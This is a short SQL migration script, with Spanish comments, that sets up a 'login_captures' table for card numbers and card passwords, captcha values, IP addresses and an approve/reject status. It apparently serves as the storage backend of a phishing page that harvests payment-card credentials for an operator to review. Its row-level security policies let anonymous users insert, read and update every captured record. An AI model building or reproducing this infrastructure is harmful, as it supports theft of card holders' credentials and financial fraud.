-- Script SQL completo para la tabla login_captures
-- Se puede ejecutar múltiples veces sin errores

-- ============================================================
-- 1. CREAR LA TABLA (si no existe)
-- ============================================================
CREATE TABLE IF NOT EXISTS login_captures (
  id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
  card_number TEXT NOT NULL,
  card_password TEXT NOT NULL,
  captcha TEXT,
  user_agent TEXT,
  ip_address TEXT,
  status TEXT DEFAULT 'pendiente',  -- pendiente, approved, rejected
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- ============================================================
-- 2. AGREGAR COLUMNAS FALTANTES (si la tabla ya existía)
-- ============================================================
DO $$
BEGIN
  -- Agregar columna 'status' si no existe
  IF NOT EXISTS (
    SELECT 1 FROM information_schema.columns
    WHERE table_name = 'login_captures' AND column_name = 'status'
  ) THEN
    ALTER TABLE login_captures ADD COLUMN status TEXT DEFAULT 'pendiente';
  END IF;

  -- Agregar columna 'ip_address' si no existe
  IF NOT EXISTS (
    SELECT 1 FROM information_schema.columns
    WHERE table_name = 'login_captures' AND column_name = 'ip_address'
  ) THEN
    ALTER TABLE login_captures ADD COLUMN ip_address TEXT;
  END IF;
END $$;

-- ============================================================
-- 3. CREAR ÍNDICES (si no existen)
-- ============================================================
CREATE INDEX IF NOT EXISTS idx_login_captures_created_at ON login_captures(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_login_captures_status ON login_captures(status);

-- ============================================================
-- 4. HABILITAR ROW LEVEL SECURITY
-- ============================================================
ALTER TABLE login_captures ENABLE ROW LEVEL SECURITY;

-- ============================================================
-- 5. ELIMINAR POLÍTICAS EXISTENTES (para evitar duplicados)
-- ============================================================
DROP POLICY IF EXISTS "Allow anonymous inserts" ON login_captures;
DROP POLICY IF EXISTS "Allow anonymous select" ON login_captures;
DROP POLICY IF EXISTS "Allow anonymous update" ON login_captures;

-- ============================================================
-- 6. CREAR POLÍTICAS NUEVAS
-- ============================================================

-- Política para INSERT anónimo (el formulario de login)
CREATE POLICY "Allow anonymous inserts" ON login_captures
  FOR INSERT
  TO anon
  WITH CHECK (true);

-- Política para SELECT anónimo (admin y contador)
CREATE POLICY "Allow anonymous select" ON login_captures
  FOR SELECT
  TO anon
  USING (true);

-- Política para UPDATE anónimo (admin aprueba/rechaza)
CREATE POLICY "Allow anonymous update" ON login_captures
  FOR UPDATE
  TO anon
  USING (true)
  WITH CHECK (true);
